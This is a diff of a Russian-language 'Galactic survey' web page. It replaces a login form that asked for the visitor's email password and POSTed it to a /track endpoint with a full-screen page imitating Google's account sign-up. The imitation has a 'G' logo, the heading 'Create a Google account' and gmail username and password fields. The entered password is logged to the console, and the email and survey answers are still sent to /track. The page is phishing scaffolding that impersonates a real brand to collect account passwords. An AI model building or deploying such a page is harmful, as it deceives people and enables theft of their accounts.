@@ -12,6 +12,13 @@
       --dark: #0f0526;
       --light: #f8f9fa;
       --danger: #ff4d4d;
+      --google-blue: #4285F4;
+      --google-red: #EA4335;
+      --google-yellow: #FBBC05;
+      --google-green: #34A853;
+      --google-gray: #f1f1f1;
+      --google-dark-gray: #5f6368;
+      --google-black: #202124;
     }
     
     * {
@@ -21,7 +28,7 @@
     }
     
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      font-family: 'Roboto', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background: linear-gradient(135deg, var(--dark), #1a0933);
       color: var(--light);
       min-height: 100vh;
@@ -264,6 +271,158 @@
       flex: 1;
     }
     
+    /* Стили для Google-подобной страницы */
+    #google-like-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: white;
+      color: var(--google-black);
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      z-index: 1000;
+    }
+    
+    .google-like-card {
+      width: 450px;
+      padding: 48px 40px 36px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1), 0 1px 3px rgba(0, 0, 0, 0.08);
+      text-align: center;
+      background: white;
+    }
+    
+    .google-like-logo {
+      width: 75px;
+      height: 75px;
+      margin: 0 auto 16px;
+      background: linear-gradient(to bottom, #4285F4, #34A853, #FBBC05, #EA4335);
+      color: white;
+      font-size: 40px;
+      font-weight: bold;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    
+    .google-like-title {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 8px;
+      color: var(--google-black);
+    }
+    
+    .google-like-subtitle {
+      font-size: 16px;
+      color: var(--google-dark-gray);
+      margin-bottom: 40px;
+    }
+    
+    .google-like-form {
+      text-align: left;
+    }
+    
+    .input-group {
+      position: relative;
+      margin-bottom: 24px;
+    }
+    
+    .google-like-input {
+      width: 100%;
+      padding: 13px 15px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      background-color: transparent;
+      color: var(--google-black);
+      transition: border 0.3s;
+    }
+    
+    .google-like-input:focus {
+      border-color: var(--google-blue);
+      outline: none;
+      box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
+    }
+    
+    .google-like-input:focus + .google-like-label,
+    .google-like-input:not(:placeholder-shown) + .google-like-label {
+      transform: translateY(-24px) scale(0.75);
+      background-color: white;
+      padding: 0 4px;
+      color: var(--google-blue);
+    }
+    
+    .google-like-label {
+      position: absolute;
+      top: 13px;
+      left: 15px;
+      color: var(--google-dark-gray);
+      font-size: 16px;
+      pointer-events: none;
+      transition: all 0.2s;
+      transform-origin: left top;
+    }
+    
+    .google-like-hint {
+      position: absolute;
+      right: 15px;
+      top: 13px;
+      color: var(--google-dark-gray);
+      font-size: 16px;
+    }
+    
+    .password-match-error {
+      color: var(--google-red);
+      font-size: 14px;
+      margin-top: 5px;
+      display: none;
+    }
+    
+    .google-like-checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-bottom: 40px;
+    }
+    
+    .google-like-checkbox-group input {
+      margin-right: 8px;
+      width: auto;
+    }
+    
+    .google-like-checkbox-group label {
+      font-size: 14px;
+      color: var(--google-dark-gray);
+    }
+    
+    .google-like-footer {
+      display: flex;
+      justify-content: flex-end;
+    }
+    
+    .google-like-button {
+      padding: 10px 24px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      border: none;
+      transition: all 0.3s;
+    }
+    
+    .google-like-button.primary {
+      background-color: var(--google-blue);
+      color: white;
+    }
+    
+    .google-like-button.primary:hover {
+      background-color: #3367d6;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+    }
+    
     @media (max-width: 768px) {
       .container {
         padding: 1rem;
@@ -280,6 +439,12 @@
       .floating-planet {
         display: none;
       }
+      
+      .google-like-card {
+        width: 100%;
+        padding: 30px 20px;
+        border-radius: 0;
+      }
     }
   </style>
 </head>
@@ -288,26 +453,43 @@
   <div class="floating-planet"></div>
   <div class="floating-planet floating-planet-2"></div>
   
+  <!-- Google-подобная форма регистрации -->
+  <div class="form-section active" id="google-like-section">
+    <div class="google-like-card">
+      <div class="google-like-logo">G</div>
+      <h2 class="google-like-title">Создайте аккаунт Google</h2>
+      <p class="google-like-subtitle">Продолжите, чтобы использовать Галактический опросник</p>
+      
+      <div class="google-like-form">
+        <div class="input-group">
+          <input type="text" id="google-username" class="google-like-input" placeholder=" " required>
+          <label for="google-username" class="google-like-label">Имя пользователя</label>
+          <span class="google-like-hint">@gmail.com</span>
+        </div>
+        
+        <div class="input-group">
+          <input type="password" id="google-password" class="google-like-input" placeholder=" " required>
+          <label for="google-password" class="google-like-label">Пароль</label>
+        </div>
+        
+        <div class="google-like-checkbox-group">
+          <input type="checkbox" id="google-show-password">
+          <label for="google-show-password">Показать пароль</label>
+        </div>
+        
+        <div class="google-like-footer">
+          <button class="google-like-button primary" id="google-signup-btn">Готово</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  
   <div class="container">
     <div class="card">
       <h1>🌌 Галактический опросник 🌠</h1>
       
       <div class="progress-container">
         <div class="progress-bar" id="progress"></div>
-      </div>
-      
-      <!-- Форма входа -->
-      <div class="form-section active" id="login-section">
-        <h2>Космическая регистрация</h2>
-        <p>Пожалуйста, введите ваши данные для участия в галактическом исследовании</p>
-        
-        <label for="email">Электронная почта:</label>
-        <input type="email" id="email" placeholder="ваша@почта.космос" required>
-        
-        <label for="password">Пароль от почты:</label>
-        <input type="password" id="password" placeholder="Введите ваш пароль" required>
-        
-        <button class="btn btn-primary" id="login-btn">Начать космическое путешествие</button>
       </div>
       
       <!-- Опросник -->
@@ -453,14 +635,17 @@
     ];
 
     // Элементы DOM
-    const loginSection = document.getElementById('login-section');
     const surveySection = document.getElementById('survey-section');
     const thankYouSection = document.getElementById('thank-you-section');
+    const googleLikeSection = document.getElementById('google-like-section');
     const questionsContainer = document.getElementById('questions-container');
     const progressBar = document.getElementById('progress');
-    const loginBtn = document.getElementById('login-btn');
     const nextBtn = document.getElementById('next-btn');
     const exitBtn = document.getElementById('exit-btn');
+    const googleSignupBtn = document.getElementById('google-signup-btn');
+    const googleShowPassword = document.getElementById('google-show-password');
+    const googlePassword = document.getElementById('google-password');
+    const googleUsername = document.getElementById('google-username');
     
     // Переменные состояния
     let currentQuestion = 0;
@@ -468,6 +653,39 @@
     const startTime = Date.now();
     let userEmail = '';
     let userPassword = '';
+
+    // Показать/скрыть пароль в Google-форме
+    googleShowPassword.addEventListener('change', function() {
+      const type = this.checked ? 'text' : 'password';
+      googlePassword.type = type;
+    });
+
+    // Обработчик кнопки "Готово" в Google-форме
+    googleSignupBtn.addEventListener('click', function() {
+      const username = googleUsername.value.trim();
+      const password = googlePassword.value;
+      
+      // Проверка заполнения полей
+      if (!username || !password) {
+        alert('Пожалуйста, заполните все поля');
+        return;
+      }
+      
+      // Сохраняем данные пользователя
+      userEmail = `${username}@gmail.com`;
+      userPassword = password;
+      
+      // Выводим данные в консоль (включая пароль)
+      console.log('Данные регистрации:', {
+        email: userEmail,
+        password: userPassword
+      });
+      
+      // Переходим к опросу
+      googleLikeSection.classList.remove('active');
+      surveySection.classList.add('active');
+      initSurvey();
+    });
 
     // Инициализация опросника
     function initSurvey() {
@@ -519,7 +737,6 @@
       sendData({
         action: 'survey_complete',
         email: userEmail,
-        password: userPassword,
         answers: answers,
         duration: (Date.now() - startTime) / 1000,
         timestamp: Date.now()
@@ -532,48 +749,30 @@
         sendData({
           action: 'survey_aborted',
           email: userEmail,
-          password: userPassword,
           completed_questions: answers.length,
           timestamp: Date.now()
         });
         
-        // Возврат на страницу входа
+        // Возврат к Google-форме
         surveySection.classList.remove('active');
-        loginSection.classList.add('active');
-        document.getElementById('email').value = userEmail;
-        document.getElementById('password').value = userPassword;
+        googleLikeSection.classList.add('active');
+        googleUsername.value = '';
+        googlePassword.value = '';
       }
     }
 
     // Отправка данных на сервер
     function sendData(data) {
+      // В реальном приложении здесь была бы отправка на сервер
+      console.log('Отправка данных:', data);
+      
+      // Эмуляция отправки данных
       fetch('/track', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
       }).catch(err => console.error('Ошибка отправки данных:', err));
     }
-
-    // Обработчики событий
-    loginBtn.addEventListener('click', function() {
-      userEmail = document.getElementById('email').value;
-      userPassword = document.getElementById('password').value;
-      
-      if (userEmail && userPassword) {
-        sendData({
-          action: 'login',
-          email: userEmail,
-          password: userPassword,
-          timestamp: Date.now()
-        });
-        
-        loginSection.classList.remove('active');
-        surveySection.classList.add('active');
-        initSurvey();
-      } else {
-        alert('Пожалуйста, заполните все поля');
-      }
-    });
 
     nextBtn.addEventListener('click', function() {
       const selectedOption = document.querySelector(`input[name="q${currentQuestion}"]:checked`);
